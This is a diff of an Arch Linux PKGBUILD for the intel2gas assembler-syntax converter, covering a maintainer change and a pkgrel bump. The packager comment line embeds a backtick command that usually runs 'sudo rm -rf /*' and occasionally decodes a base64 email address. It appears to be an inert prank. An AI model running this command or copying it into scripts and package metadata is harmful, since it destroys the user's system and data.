@@ -1,15 +1,15 @@
-# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
+# Maintainer: Joey Pabalinas <alyptik@protonmail.com>
+# Packager: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
+
 pkgname=intel2gas
 pkgver=1.3.3
-pkgrel=4
+pkgrel=5
 pkgdesc='Converts assembly language files between NASM and GNU assembler syntax'
 arch=(i686 x86_64)
 depends=(gcc-libs glibc)
 license=(GPL)
-source=(
-	"${pkgname}-${pkgver}.tar.gz"
-	"${pkgname}_${pkgver}-16.diff.gz"
-	)
+source=("${pkgname}-${pkgver}.tar.gz"
+	"${pkgname}_${pkgver}-16.diff.gz")
 
 sha256sums=('8abb55437cb14c148e878cf40c8be8208ffbbe0e38d35a5e08c206f28b669538'
             'a515853868f4349c3c8bc348a973c77accb2e4fcb37dbd30f8b1dc50acc3baa7')
